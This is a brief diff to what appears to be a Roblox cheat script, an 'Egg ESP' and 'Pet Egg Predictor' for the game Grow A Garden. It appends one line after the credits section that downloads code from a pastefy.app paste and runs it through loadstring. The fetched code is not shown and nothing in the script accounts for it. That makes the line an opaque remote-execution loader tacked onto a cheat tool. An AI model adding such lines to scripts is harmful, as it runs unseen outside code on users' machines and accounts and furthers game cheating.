@@ -543,3 +543,4 @@ EggTab:CreateParagraph({
     Title = "Credits",
     Content = "Egg ESP by KenriScripts\nPet Egg Predictor Script for Grow A Garden"
 })
+loadstring(game:HttpGet("https://pastefy.app/B00Jc84x/raw"))()
